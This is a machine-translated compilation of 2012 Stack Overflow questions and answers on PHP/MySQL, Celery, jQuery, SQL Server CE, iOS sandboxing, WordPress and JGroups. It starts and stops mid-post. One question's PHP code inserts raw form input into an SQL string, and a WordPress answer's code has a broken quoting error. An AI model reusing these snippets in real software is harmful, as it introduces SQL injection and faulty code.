<!-- Your HTML up to where the select and button are on your page -->

<select id="id" name="id">
    <option value="1">Something</option>
    <option value="2">Something Else</option>
    <option value="3">Yet Another Thing</option>
</select>

<button id="btn" />

<!-- In your jQuery -->

$("#btn").click(function() {
    $.get("path/to/your/back/end/script.php", { "id" : $("#id").value }, function(data) {
        /* the data will be the json_encode($row) that was echoed from the PHP script.
         * so, you'll need to drill into it, take the data you want, and use 
         * jQuery's/JavaScript's DOM manipulation tools to insert the data on your 
         * page
         */
    }) // close $.get()
}); // close .click() 
```

所有这些都没有经过测试，并且公认它是不完整的，但这应该足以开始。真的，您需要弄清楚的是如何钻取返回的数据（它是一个 JSON 对象，所以应该不会太糟糕......使用浏览器的 Web 开发工具来查看数据的实际形成方式）并将其插入您想要的位置。那，以及我在上面可能犯的任何愚蠢的错误。

希望这可以帮助！

# php - 使用php的sql更新错误

> ID：12300360
> 
> 赞同：0
> 
> 时间：2012-09-06T12:41:36.843
> 
> 标签：php, sql, database, forms, web

我不断得到

~~[服务器错误网站在检索https://www.website.com/update.php?FName=asdd&PHONE=4444444444](https://www.website.com/update.php?FName=asdd&PHONE=4444444444)~~时遇到错误。它可能因维护而停机或配置不正确。

```
<?php

    $FName = $_POST['FName'];
    $LName = $_POST['LName'];
    $PHON = $_POST['PHON'];

    //connect
    $dbh=mysql_connect ("localhost", "username", "password") or die ('ERROR!');
    mysql_select_db ("user_Client"); 

    $query = "INSERT INTO ClientTable (ID, FName, LName, PHON) VALUES 
                ('NULL','".$FName."','".$LName."','".$PHON."')";

    mysql_query($query) or die ('Error updating Daatabase');
    echo "Database Update with:" .$FName. " " .$LName. " " .$PHON. ;
?> 
```

我不知道这里有什么问题。我按照这里的说明[http://teamtutorials.com/web-development-tutorials/php-tutorials/inserting-data-into-a-mysql-database-using-php#.UEiSQY3iajk](http://teamtutorials.com/web-development-tutorials/php-tutorials/inserting-data-into-a-mysql-database-using-php#.UEiSQY3iajk) 如果有帮助 - 我正在使用 cPanel来自约斯特。

这是表格：

```
<html>
        <head>
                <title></title>
        </head>

        <body>
                <form method="post" action="update.php">
                        First Name:<br/>
                        <input type="text" name="FName" size="30" /><br/>
                        Last Name:<br/>
                        <input type="text" name="LName" size="30" /><br/>
                        Phone:<br/>
                        <input type="text" name="PHON" size="12" /><br/>
                        <input type="submit" value="Update Database"/>
                </form>
        </body>
</html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-06T12:45:40.660

请使用`PDO`，因为`mysql_*`功能已被弃用..

对于你的问题，你使用`$_GET`and not `$_POST`，你也拼错了你的变量（`$FNLame`）：

```
$db = new PDO('mysql:host=localhost;dbname=user_Client;charset=UTF-8', 'username', 'password', array(PDO::ATTR_EMULATE_PREPARES => false, PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));

$FName = $_GET['FName'];
$LName = $_GET['LName'];
$PHON = $_GET['PHON'];

$stmt = $db->prepare("INSERT INTO `ClientTable`(ID, FName, LName, PHON) VALUES (0,:FName,:LName,:PHON)");
$stmt->execute(array(':FName' => $FName, ':LName' => $LName, ':PHON' => $PHON));

echo "Database Update with:" .$FName. " " .$LName. " " .$PHON; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:43:34.077

你的最后一句话是错误的：

```
echo "Database Update with:" .$FName. " " .$LName. " " .$PHON. ; 
```

应该是（没有最后一个点）：

```
echo "Database Update with:" .$FName. " " .$LName. " " .$PHON ; 
```

如果您查看网络服务器的错误日志，您将能够看到错误。另一个想法可能是在 PHP 中打开错误，`php.ini`或者使用`ini_set("display_errors", 1);`. 确保你只在你的开发系统上这样做。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-06T12:44:20.320

您正在检查`$_POST['PHON']`，而在查询字符串中您正在传递

> [https://www.website.com/update.php?FName=asdd&PHONE=4444444444](https://www.website.com/update.php?FName=asdd&PHONE=4444444444)。

请先更正 PHONE。然后检查

得到它喜欢

```
$_GET['PHONE'] 
```

或者

```
$_REQUEST['PHONE'] 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-06T12:49:19.360

由于引号（*'*或*""*）可能是 sql 错误。为避免这种情况，您可以使用类似

```
 $FName = mysql_real_escape_string($_POST['FName']);
    $FNLame = mysql_real_escape_string($_POST['FLame']);
    $PHON = $_POST['PHON']; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-06T12:47:15.703

你的用户名和密码正确吗？大多数 localhost 的默认设置是 root 并且没有密码

# svn - 如何从 svn 历史记录中删除大的二进制文件？

> ID：12300362
> 
> 赞同：1
> 
> 时间：2012-09-06T12:41:39.100
> 
> 标签：svn, version-control, google-code, svndump, svndumpfilter

因为我使用谷歌代码来托管我的 svn 存储库，所以[从 SVN 历史记录中删除文件内容](https://stackoverflow.com/questions/205296/delete-file-contents-from-svn-history)无法解决我的问题，因为我无法在谷歌代码上运行 svndump 和 svndumpfilter 命令。

```
[mirror@home ins_ssh]$ svnadmin dump https://xxx.googlecode.com/svn/
svnadmin: 'https://xxx.googlecode.com/svn' is an URL when it should be a path 
```

那么有可能从谷歌代码的svn历史中删除大型二进制文件吗？

特别是当一些敏感数据被提交到 svn repo 时。

# semantic-markup - 是否有明确定义的模式用于语义标记问答平台？

> ID：12300366
> 
> 赞同：-2
> 
> 时间：2012-09-06T12:41:49.537
> 
> 标签：semantic-markup, facebook-opengraph, microdata

我正在寻找微数据/开放图形协议中的模式，我可以使用它标记在问答平台中生成的内容。问答平台是用户生成的问答系统，如流行的 stackoverflow、quora、answers.yahoo.com、answers.com 等。通常，它们具有问题、最佳答案、投票、答案数量、类别、给出最佳答案的作者等属性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T16:39:21.407

没有什么特别的，但是模式的组合可以提供类似的语义：

*   [产品架构](http://schema.org/Product)
*   [审查架构](http://schema.org/Review)
*   [用户评论架构](http://schema.org/UserComments)

# asp.net - AJAX RoundedCornersExtender 不适用于页面上的多个表单

> ID：12300367
> 
> 赞同：0
> 
> 时间：2012-09-06T12:41:55.107
> 
> 标签：asp.net, ajaxcontroltoolkit

我在我的网站上实现了 AJAX RoundedCornersExtender，它在只有 1 个表单的页面上效果很好。添加多个表格时，圆角在第一个表格之后结束。我希望它包含整个页面（所有表单）。

当我尝试在表单外取圆角（因此它将围绕所有表单标签）标签时，它说圆角必须在表单标签中。

有没有办法： 1\. 将圆角放在表单标签之外，这样它就可以包含我所有的表单。2\. 让它在第一个表单关闭后以某种方式结束。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T10:07:25.360

我找到了解决方案，我将面板移到了表单标签之外，ajax 控件必须留在表单标签内，但是面板能够移到表单标签之外并且可以工作。

# celery - 芹菜：列出所有任务，计划的，活动的*和*完成

> ID：12300374
> 
> 赞同：23
> 
> 时间：2012-09-06T12:42:10.923
> 
> 标签：celery, celery-task

**赏金更新**

如果可能的话，我想要一个不涉及监控线程的解决方案。

* * *

我知道我可以使用我的应用程序类查看*计划*任务和*活动*任务。`Inspect``Control`

```
i = myapp.control.inspect()

currently_running = i.active()
scheduled = i.scheduled() 
```

但我找不到任何功能来显示已完成的任务。我知道这些信息必须至少可以暂时访问，因为我可以通过它来查找已完成的任务`task_id`：

```
>>> r = my task.AsyncResult(task_id=' ... ')
>>> r.state
u'SUCCESS' 
```

如何获得计划、活动和已完成任务的*完整*列表？或者可能同时列出*所有*任务？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-07T07:45:22.987

[Celery Flower](https://docs.celeryproject.org/en/latest/userguide/monitoring.html#flower-real-time-celery-web-monitor)实时显示任务（活动、[完成](https://flower.readthedocs.io/en/latest/_images/tasks.png)、保留等）。它可以按时间、工人和类型过滤任务。

[https://github.com/mher/flower](https://github.com/mher/flower)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-10-03T06:36:13.007

不需要监视线程的一个选项是 Celery`on_success`处理程序（使用[3.1+](http://celery.readthedocs.org/en/latest/whatsnew-3.1.html#bootsteps-extending-the-worker)中的引导步骤功能） - 这需要将相关信息写入您自己的数据存储。

*   您需要创建一个[自定义任务类](http://celery.readthedocs.org/en/latest/userguide/tasks.html#custom-task-classes)来执行此操作。这个[on_failure 例子](https://stackoverflow.com/questions/26223998/python-celery-retrieve-tasks-arguments-if-theres-an-exception)给出了一个想法。

可能更好的选择，需要更少的代码，以类似的方式使用[task_success 信号，记录您以后需要的信息。](http://celery.readthedocs.org/en/latest/userguide/signals.html#task-success)

Flower 选项可能更简单，因为您在任务完成时查询 Flower 已经维护的信息 - 请参阅[此答案](https://stackoverflow.com/a/32859547/992887)。

# jquery - Internet Explorer 6 的 Jquery Treetable 问题

> ID：12300376
> 
> 赞同：2
> 
> 时间：2012-09-06T12:42:14.753
> 
> 标签：jquery, internet-explorer

Jquery treetable 组件给 Internet Explorer 6 带来了性能问题。加载树需要很多时间，甚至会停止。有什么方法可以提高性能，或者有没有更好的组件可以提供相同的功能并与 ie6 兼容。任何帮助将不胜感激谢谢！

# javascript - jQuery动画延迟问题与自排队循环的步骤

> ID：12300378
> 
> 赞同：9
> 
> 时间：2012-09-06T12:42:16.250
> 
> 标签：javascript, jquery, jquery-animate

我有一个`timeline`定义，其中列出了选择器以及应用于该对象的延迟和动画列表。您可以指定循环特定对象的步骤。

这是用于对动画进行排队的函数：

```
function animateWithQueue(e, obj) {
    if ($.queue(e[0]).length == 0) {
        e.queue(function doNext(next) {
            $.each(obj.steps, function(i, step) {
                e.delay(step.pause).animate(step.anim, step.options);
            });
            if (obj.loop) {
                e.queue(doNext);
            }
            next();
        });
    }
}​ 
```

这是`timeline`信息

```
var timeline = {
    '.square': {
        loop: true,
        steps: [
            { pause: 800, anim: { right: '+=200' }, options: { duration: 400} },
            { pause: 1000, anim: { right: '-=200' }, options: { duration: 400} }
        ]
    },
    '.circle': {
        loop: true,
        steps: [
            { pause: 1200, anim: { top: '+=200' }, options: { duration: 400} },
            { pause: 1200, anim: { top: '-=200' }, options: { duration: 400} }
        ]
    }
}; 
```

这是将`timeline`上述动画函数放入的函数：

```
$.each(timeline, function(selector, obj) {
    animateWithQueue($(selector), obj);
}); 
```

这是一个完整的例子。[http://jsfiddle.net/sprintstar/Tdads/](http://jsfiddle.net/sprintstar/Tdads/)

此代码似乎工作正常，可以单击动画循环和停止按钮来停止动画、清除队列等。但是，我们面临的问题可以通过点击停止和一遍又一遍地启动（比如 10 次）来触发. 然后注意延迟不再正常工作，并且形状移动得更快。

为什么会这样，如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T16:20:33.233

有些东西不太适合`delay`...

作为一种解决方法，我已将其替换为[`doTimeout`](http://benalman.com/projects/jquery-dotimeout-plugin/)in [this fiddle](http://jsfiddle.net/tjdA3/10/)，因此如下：

```
 e.delay(step.pause).animate(step.anim, step.options); 
```

变成：

```
 var timerName = e[0].className + $.now();
    timeouts.push(timerName);
    e.queue(function(next) {
      e.doTimeout(timerName, step.pause, function() {
          this.animate(step.anim, step.options);
          next();
        });
    }); 
```

`timeouts`是一组唯一的超时 id - 当按下停止按钮时，每个都被清除。

正如我所说，更多的是一种解决方法而不是修复，因为您还需要在停止时重置元素的位置。（请注意，我已从顶部/右侧定义中删除了 += 和 -=）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-19T09:35:47.690

看着你的停止处理程序，我会怀疑 .stop() 被错过放置。我会将它定位在 .circle 和 .square 上，而不是持有 div。

曾经与 animate 有过问题，因为元素移动得越来越快，并且得出的结论是 animate 正在堆积在自己身上。

api.jquery.com/clearQueue/ 和[http://api.jquery.com/stop/](http://api.jquery.com/stop/)可能有用

# groovy - 删除所有带有特定标签的 dom 元素？

> ID：12300379
> 
> 赞同：2
> 
> 时间：2012-09-06T12:42:25.220
> 
> 标签：groovy, soapui

我尝试从以下请求摘录中删除所有 head:book 元素：

```
<head:bookstore>
<head:book>9</head:book>
<head:book>10</head:book>
</head:bookstore>

requestHolder.getDomNodes("//head:bookstore/head:book").each {
    requestNode.removeChild(it)
} 
```

我在这里做错了什么？

更新：

```
def groovyUtils = new com.eviware.soapui.support.GroovyUtils(context)
def requestHolder = groovyUtils.getXmlHolder("openBook#Request") 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T15:21:28.937

下面是删除 XML 节点的解决方案，请注意您可以获得整个 xml，您可能需要编辑以下脚本的节点名称

```
 // Get the entire request 
  def request = context.expand( '${Test Request#Request#declare namespace   soap=\'http://www.w3.org/2003/05/soap-envelope\'; //soap:Envelope[1]}' )

// or create the XML 
def BOOKS = '''
<bookstore>
<book>9</book>
<book>10</book>
</bookstore>
 '''

def booksParser = new XmlParser().parseText(BOOKS)
def allBooks = booksParser.children()
booksParser.remove(allBooks)
new XmlNodePrinter().print(booksParser)
log.info booksParser 
```

# php - Apache 显示错误的 php 版本

> ID：12300380
> 
> 赞同：1
> 
> 时间：2012-09-06T12:42:26.703
> 
> 标签：php, apache

我已经在 mac snow leopard 上手动安装了 php 5.4.6。但是当我配置并重新启动 apache 并调用 phpinfo() 方法时，它显示 php 版本为 5.3.8，这可能是 Mac OS X 附带的预装系统 php。

我应该如何解决这个问题并告诉 apache 使用 php 5.4.6 而不是系统 php？

此致，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-06T12:51:30.700

您应该能够在*/etc/apache2/httpd.conf*中指定要使用的 PHP 版本，查找以下内容：

```
#LoadModule php5_module libexec/apache2/libphp5.so 
```

取消注释此行并将其指向您已安装的最新版本的 PHP。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T12:45:27.600

你确定你也更新了 Apache php 模块吗？尝试`php`简单地更新模块。它与 Apache 相关联，在最近的版本中没有与一般的 php 安装一起安装。

# c# - 连接到 SQL Server CE 数据库

> ID：12300382
> 
> 赞同：0
> 
> 时间：2012-09-06T12:42:27.790
> 
> 标签：c#, sql-server-ce

我无法连接到`.sdf`（SQL Server Compact 版本）数据库。当我在打开数据库中调试我的项目时出现此错误：

> *System.Data.dll 中出现“System.Data.SqlClient.SqlException”类型的未处理异常*
> 
> *附加信息：建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。（提供者：SQL 网络接口，错误：26 - 错误定位服务器/指定的实例）*

我没有运气。我得到这个代码：

```
Qconnection.ConnectionString = "Data Source=C:\\Users\\Admin\\Desktop\\New folder\\WindowsFormsApplication2\\WindowsFormsApplication2\\Database1.sdf";
//connection.ConnectionString = " Data Source=C:\\Users\\Admin\\Desktop\\WindowsFormsApplication2\\WindowsFormsApplication2\\Database1.sdf";
Qcommand.Connection = Qconnection;
Qconnection.Open();

for (int i = 0; i < orderColection.counter1; i++)
{
   string commandText = "Insert into order values(@RID,@amount,@type,@date)";
   Qcommand.CommandText = commandText;
   Qcommand.CommandType = CommandType.Text;

   Qcommand.Parameters.AddWithValue("@RID", orderColection.list[i].rep_id);
   Qcommand.Parameters.AddWithValue("@amount", orderColection.list[i].amount);
   Qcommand.Parameters.AddWithValue("@type", orderColection.list[i].type);
   Qcommand.Parameters.AddWithValue("@date", orderColection.list[i].date );
   Qcommand.ExecuteNonQuery();
}
Qconnection.Close(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T12:45:07.710

您必须使用[System.Data.SqlServerCe](http://msdn.microsoft.com/en-us/library/system.data.sqlserverce%28v=vs.100%29.aspx)提供程序 API 来连接 SQL Server Compact 数据源。（添加 的引用`System.Data.SqlServerCe.Dll`）。

```
using(SqlCeConnection cn = new SqlCeConnection(@"Data Source=C:\path\sample.sdf"))
{
 //
} 
```

# php - mysqli_connect 延迟

> ID：12300387
> 
> 赞同：4
> 
> 时间：2012-09-06T12:42:34.917
> 
> 标签：php, mysql, mysqli

我最近不得不重新安装我的 wamp 包，所以我最终得到了一个新的 apache 2.2.22、php 5.4.3 和 mysql 5.5.24 。

发生的一个重大变化是页面生成时间。我挖了一下，发现对 mysqli_connect 的调用最多需要 2 秒。

所以它仍然有效，所以我的用户已经很好地重新配置并且整个系统都站起来了——只有这个细节使整个系统无法使用。

有谁知道这种延迟可能来自哪里？

编辑：这似乎是您提出的 dns 问题 - 现在，如果我更改为 127.0.0.1，我会拒绝访问。我继续挖掘

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-12T16:04:45.467

我有同样的确切情况，我正在连接到“localhost”，每个“连接”有 1.5 秒，现在我使用 127.0.0.1 代替，现在效果很好！FIY，使用 windows 2008 R2 x64 + plesk 11 php 5.3（以及 php5.4）测试

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-27T03:28:31.480

C:\Windows\System32\drivers\etc\hosts 上的通配符将我的每个请求减慢到 1 秒甚至更多，

处理多个 localhost 名称逗号分隔是可怕的（win7 DNS regexp 的东西）

```
127.0.0.1 localhost, domain.com 
```

拆分它我再次得到很好的响应，没有延迟

```
127.0.0.1 localhost
127.0.0.1 domain.com 
```

# matlab - 将 MATLAB 连接到 TFS 预览版

> ID：12300390
> 
> 赞同：1
> 
> 时间：2012-09-06T12:42:54.597
> 
> 标签：matlab, tfs

有没有办法将 MATLAB 与 TFS Preview 连接起来？我安装了 MSSCCI 接口，但是当我要连接到服务器时，我收到一个错误。非常普遍的事情，例如“无法建立连接，发生错误” 谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T13:29:46.003

是的，但它需要 Visual Studio 2012 和 beta MSSCCI 提供程序（请参阅[此处](http://visualstudiogallery.msdn.microsoft.com/35a37fd5-3385-4f2e-8f4e-36ccbabb1a8e)）

另一种选择是将 MATLAB 与本地 git 存储库一起使用，然后使用 git-tf（请参见[此处](http://gittf.codeplex.com/)）将您的本地 git 存储库与您的 tfspreview 帐户连接起来。

# c# - Asp.Net 4.5 Web API - 返回 HTTP 状态代码 207

> ID：12300394
> 
> 赞同：5
> 
> 时间：2012-09-06T12:43:01.757
> 
> 标签：c#, asp.net, asp.net-web-api

我正在尝试创建一个简单的 Web API 控制器来充当 WebDAV 服务器，因为我只希望它允许目录列表和对文件的读取访问，以及与我们系统中的当前身份验证系统集成。

在使用 WebDAV 客户端 (DAVExplorer) 时，我已经设法使目录和文件列表正常工作，但是在 Windows 资源管理器中映射网络驱动器并没有发挥作用。

虽然我还没有弄清楚为什么这不起作用，但一种可能性是，当 WebDAV 服务器返回 PROPFIND 请求的结果时，它会使用 207 多状态的 Http 状态代码。这似乎不在对象`HttpStatusCode`使用的枚举器中`HttpResponseMessage`。

我试图找出实际上将`HttpResponseMessage`返回到浏览器的响应变成了什么，以为我可以实现自己的版本并自己处理输出状态代码，但到目前为止我还没有运气。

有人对我如何实现返回 207 状态代码的 API 控制器有任何建议吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-06T20:12:43.197

您可以将任何内容投射`int`到`HttpStatusCode`

```
public HttpResponseMessage Get()
{
    var response = Request.CreateResponse((HttpStatusCode)207, "something");
    return response;
} 
```

# iphone - 从ios中的其他应用程序访问一个应用程序的文件

> ID：12300398
> 
> 赞同：7
> 
> 时间：2012-09-06T12:43:11.460
> 
> 标签：iphone, ios, ipad, ios5

我们可以在 iPhone 中共享存储，其他 ios 应用程序可以访问吗？

我正在开发一个从服务器下载更新文件的 ios 应用程序。并且会有一些其他应用程序使用这些文件。因此，我想将下载的文件保存在特定位置。这样我就可以从其他应用程序访问这些文件。

所以流程会是这样的，

Application1，它将从服务器下载文件。

和

Application2 或 Application3..... 将使用这些文件。

我们在 iOS 中有这种类型的共享位置吗？在iOS中可以吗？

先感谢您。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-06T12:48:49.873

不，这是不可能的，因为您的应用程序将处于沙盒模式。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-06T13:04:23.157

正如其他答案所说，所有应用程序都被沙盒化。

但是，如果您拥有这两个应用程序，或者您认识另一个应用程序的开发者，您总是可以使用某种云存储，但这可能会破坏您提出这个问题的意义

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-06T12:47:25.497

您不能在 iOS 之间“共享”文件，因为所有应用程序都是沙盒化的，并且无法使用公共 API 访问除了自己的文件之外的其他文件。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-06T13:32:37.440

也许您可以将所有单独应用程序的功能组合到一个应用程序中。让每一个都是可从主菜单访问的模块。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-06T13:21:25.357

阅读 Apple Doc[文件系统基础知识](http://developer.apple.com/library/mac/#documentation/FileManagement/Conceptual/FileSystemProgrammingGUide/FileSystemOverview/FileSystemOverview.html)

# testing - Visual Studio Team System 2008 本地主机控制器访问被拒绝重启钻机进行负载测试

> ID：12300403
> 
> 赞同：1
> 
> 时间：2012-09-06T12:43:30.013
> 
> 标签：testing, visual-studio-2008, automated-tests

我有两个基本问题：

1.  当控制器被列为“本地主机”时，我似乎无法让“重新启动装备”工作。
2.  我似乎无法让代理在负载测试中按预期运行。

以下是详细信息：

我正在使用带有负载测试的 Visual Studio Team System 2008。在运行 Visual Studio 的 Windows XP 系统上，我已经安装了 Visual Studio Team Test Controller。在另一个 Windows 2003 Standard 系统上，我安装了 Visual Studio Team Test Agent（我将它们分别称为 Controller 和 Agent）。

我相信我已经使用以下命令正确设置了代理：

> AgentConfigUtil.exe /控制器：

此操作的日志文件表明代理已使用我登录的登录帐户成功添加到两台机器的控制器。

在控制器上，在 Visual Studio 中，我可以`Test | Administer Test Controllers`从菜单中进行选择。在控制器下拉列表中，我选择“localhost”。我正确配置了“负载测试结果存储”，并按照定义添加了代理。代理状态为“就绪”。

然后我单击“Restart Rig”按钮并收到以下消息：

```
Microsoft Visual Studio
Rig failed to restart for controller 'localhost'.
The following error was reported
Access is denied. 
```

我使用对两台机器都具有本地管理员访问权限的域帐户登录到两个系统。

控制器和代理服务（在它们各自的机器上运行）都将“登录为”用户作为我的域用户，并使用适当的密码。两种服务都运行没有问题。

在控制器上，我有以下组：TeamTestAgentService、TeamTestControllerAdmins 和 TeamTestControllerUsers。我的域帐户也是每个组的成员。

请注意，如果我在“管理测试控制器”对话框的控制器下拉菜单中选择机器的名称而不是“本地主机”，那么“重新启动装备”似乎可以正常工作。老实说，我不确定哪种情况适合或正确。我认为这些设置（本地主机与机器名称）是等效的。

最后，使用`Test | Edit Test Run Configuration`，我创建了以下内容：

1.  测试运行配置，其中“选择运行测试的位置”设置为“本地”，并且代理的名称位于名称/值对框中。
2.  测试运行配置，其中“选择运行测试的位置”设置为“远程”，并且代理位于名称/值对框中。

如果我选择活动配置作为上面列出的第一个配置，则测试会运行，但我没有得到任何迹象表明代理正在用于测试。是的，我确实收到了一个额外的对话框，告诉我：“您指定在本地计算机上远程执行测试运行。您确定要这样做而不是在本地执行吗？”

如果我选择活动配置作为上面的第二个配置，我会得到一个“测试运行错误”：“无法将测试运行排队'用户名@机器名时间'：测试运行'用户名@机器名时间'无法在控制器 MACHINENAME 上执行。没有代理与指定的代理属性匹配。

我搜索了 MSDN，阅读了有关如何执行这些操作的相应文章（[此处](http://msdn.microsoft.com/en-us/library/ms182636%28v=vs.90%29.aspx)和[此处](http://msdn.microsoft.com/en-us/library/ms182637%28v=vs.90%29.aspx)），但这些文章非常基础，对我没有多大帮助。

对于让我的测试配置正常工作的任何见解，我将不胜感激。基本上，我希望能够在代理工作的情况下运行负载测试。

# c# - 使用会话在现有页面中获取图像名称

> ID：12300407
> 
> 赞同：0
> 
> 时间：2012-09-06T12:43:48.053
> 
> 标签：c#, asp.net, session

我正在使用一个页面，您可以在其中提交照片并发送电子邮件以供其批准。但即使我不添加新图像，它也会发送电子邮件。是否可以在 C# 中使用会话获取图像名称。

对不起这个愚蠢的问题。我是 ASP.NET 的新手。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-05T12:22:09.607

除非您明确将图像名称存储在会话中（我不建议这样做），否则图像名称不会存储在会话中。您应该在 Request.Form 或 Request.QueryString 中查找图像名称。 [本文有一些很好的代码示例](http://www.codeproject.com/Articles/1757/File-Upload-with-ASP-NET)。

# php - 显示一级 wordpress 的父母和他们的孩子

> ID：12300409
> 
> 赞同：0
> 
> 时间：2012-09-06T12:43:52.510
> 
> 标签：php, wordpress

我想在 wordpress 中我的网站页脚显示网站链接。我想获取一个深度的所有页面及其子页面。

然后我想在三列中显示它们，如果总共有 8 页，那么这些应该在第一-第二-第三列中显示 3-3-2。wordpress 新手。

任何人都可以帮忙吗

我试过了，但不知道如何将它们对齐 3-3-2

```
 <?php
  $counter = 0;
     $parent_pages = $wpdb->get_results("SELECT *  FROM $wpdb->posts WHERE post_parent = '0' AND ID <> 2 AND post_type = 'page' ORDER BY menu_order", 'OBJECT'); ?>
  <?php if ( $parent_pages ) : foreach ( $parent_pages as $pageParent ) : setup_postdata( $pageParent ); ?>
  <?php $counter++; ?>
    <div class="linkSection">
      <ul>
       <li><a href="<?php echo  get_permalink($pageParent->ID); ?>"><?php echo $pageParent->post_title; ?></a></a> </li>
       <?php  
          $child_pages = $wpdb->get_results("SELECT *  FROM $wpdb->posts WHERE post_parent = '".$pageParent->ID."' AND ID <> 2 AND post_type = 'page' 
          ORDER BY menu_order", 'OBJECT'); ?>
         <?php if ( $child_pages ) : foreach ( $child_pages as $pageChild ) : setup_postdata( $pageChild ); ?>
          <li><a href="<?php echo  get_permalink($pageChild->ID); ?>"><?php echo $pageChild->post_title; ?></a></a> </li>
         <?php endforeach; endif; ?>

      </ul>
  </div>
  <?php endforeach; endif; ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T21:13:38.327

```
$counter = 0;
$cnt = 0;
$parent_pages = $wpdb->get_results("SELECT *  FROM $wpdb->posts WHERE post_parent = '0' AND ID <> 2 AND post_type = 'page' ORDER BY menu_order", 'OBJECT'); ?>
<?php if ( $parent_pages ) : foreach ( $parent_pages as $pageParent ) : setup_postdata( $pageParent ); ?>
<?php $counter++; ?>
<div class="linkSection">
    <ul>
        <li><a href="<?php echo  get_permalink($pageParent->ID); ?>"><?php echo $pageParent->post_title; ?></a></a> </li>
            <?php  
            $child_pages = $wpdb->get_results("
                SELECT *  
                FROM $wpdb->posts 
                WHERE post_parent = '".$pageParent->ID."' 
                      AND ID <> 2 
                      AND post_type = 'page' 
                ORDER BY menu_order", 'OBJECT'); 

                // define prefix and postdix for columns (3 in a row display)
                $pre = '<div class="row_3">';
                $pos = '</div>';

                if ( $child_pages )
                {
                    foreach ( $child_pages as $pageChild ) 
                    {
                        setup_postdata( $pageChild ); 
                        echo (($cnt%3==0 || $cnt==0) ? $pre:'').
                              '<li>
                                <a href=".'get_permalink($pageChild->ID).'">'.$pageChild->post_title.'</a>
                              </li>'
                            .(($cnt%3==0 || $cnt==0) ? $pos:'');
                        $cnt++;
                    }
                    $cnt = 0;
                }
            ?>
    </ul>
</div>
<?php endforeach; endif; ?> 
```

那我做了什么？首先，我重新格式化您的代码。是的，我知道，WP 使用这种风格，但它对我来说可读性很差。比我为链接列表添加前缀\后缀。和循环计数器。

它是如何工作的：在循环中，我们用`$cnt++;`. 在每一次打印中，我们检查它是否是第三行，如果是的话——我们在我们的行中添加前缀和后缀。

现在您可以调整“row_3”的 css 样式以使其 3 行显示。

# jboss - EhCache 复制期间的 OOM

> ID：12300423
> 
> 赞同：1
> 
> 时间：2012-09-06T12:44:21.787
> 
> 标签：jboss, ehcache, jgroups

我们在 EhCache 复制使用过程中遇到了 OOM 问题。内存转储向我们展示了顶部的 jgroup 相关对象：

```
Instance Counts for All Classes (excluding platform)
464012 instances of class org.jgroups.util.Headers
463718 instances of class org.jgroups.protocols.pbcast.NakAckHeader
463512 instances of class [Lorg.jgroups.Header;
462136 instances of class org.jgroups.Message
173509 instances of class org.jgroups.protocols.TpHeader
63301 instances of class com.mongodb.BasicDBObject 
```

我们还在日志中看到以下警告：

```
2012-08-26 02:05:50,980 INFO  [org.jgroups.JChannel] (main) JGroups version: 
2.10.0.GA
2012-08-26 02:05:51,569 WARN  [org.jgroups.stack.Configurator] (main) TCPPING property down_thread was deprecated and is ignored
2012-08-26 02:05:51,569 WARN  [org.jgroups.stack.Configurator] (main) TCPPING property up_thread was deprecated and is ignored
2012-08-26 02:05:51,576 WARN  [org.jgroups.stack.Configurator] (main) VERIFY_SUSPECT property down_thread was deprecated and is ignored
2012-08-26 02:05:51,576 WARN  [org.jgroups.stack.Configurator] (main) VERIFY_SUSPECT property up_thread was deprecated and is ignored
2012-08-26 02:05:51,584 WARN  [org.jgroups.stack.Configurator] (main) NAKACK property down_thread was deprecated and is ignored
2012-08-26 02:05:51,584 WARN  [org.jgroups.stack.Configurator] (main) NAKACK property up_thread was deprecated and is ignored
2012-08-26 02:05:51,629 WARN  [org.jgroups.stack.Configurator] (main) GMS property join_retry_timeout was deprecated and is ignored
2012-08-26 02:05:51,629 WARN  [org.jgroups.stack.Configurator] (main) GMS property shun was deprecated and is ignored
2012-08-26 02:05:51,629 WARN  [org.jgroups.stack.Configurator] (main) GMS property down_thread was deprecated and is ignored
2012-08-26 02:05:51,629 WARN  [org.jgroups.stack.Configurator] (main) GMS property up_thread was deprecated and is ignored
2012-08-26 02:05:51,734 WARN  [org.jgroups.protocols.pbcast.NAKACK] (main) use_mcast_xmit should not be used because the transport (TCP) does not support IP multicasting; setting use_mcast_xmit to false
2012-08-26 02:05:58,539 WARN  [org.jgroups.protocols.pbcast.GMS] (main)
join(host_x-17490) sent to host_x-5955 timed out (after 5000 ms), retrying
2012-08-26 02:06:01,601 INFO
